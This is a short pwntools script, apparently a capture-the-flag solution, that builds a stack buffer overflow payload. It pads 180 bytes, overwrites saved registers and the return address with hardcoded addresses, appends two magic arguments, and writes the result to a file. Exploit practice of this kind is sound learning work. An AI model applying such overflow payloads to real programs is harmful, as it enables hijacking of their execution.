from pwn import *

junk = b"A" * 180
ebx = b"BBBB"
ebp = b"CCCC"

eip = p32(0x80491e2)
ret = p32(0x08049080)
second = p32(0xdeadbeef)
first = p32(0xc0ded00d)

pay = junk + ebx + ebp + eip + ret + second + first + b"\n"

f = open("pay", "wb")
f.write(pay)



